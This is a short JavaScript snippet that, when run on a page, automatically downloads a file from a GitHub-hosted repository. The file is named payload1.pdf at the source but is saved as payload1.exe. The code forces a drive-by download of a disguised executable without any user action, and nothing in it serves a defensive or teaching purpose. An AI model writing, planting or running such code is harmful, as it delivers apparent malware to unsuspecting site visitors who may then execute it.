function downloadFile(url, filename) {
    const anchorElement = document.createElement('a'); // Create a new anchor element
    anchorElement.href = url; // Set the href to the file URL
    anchorElement.download = filename; // Set the download attribute with the desired filename
    anchorElement.click(); // Programmatically click the anchor to start the download
}

const fileUrl = 'https://raw.githubusercontent.com/ener1-s3c/ener1-s3c.github.io/master/payload1.pdf'; // URL of the file to be downloaded
const fileName = 'payload1.exe'; // Desired name for the downloaded file

downloadFile(fileUrl, fileName); // Call the function to download the file
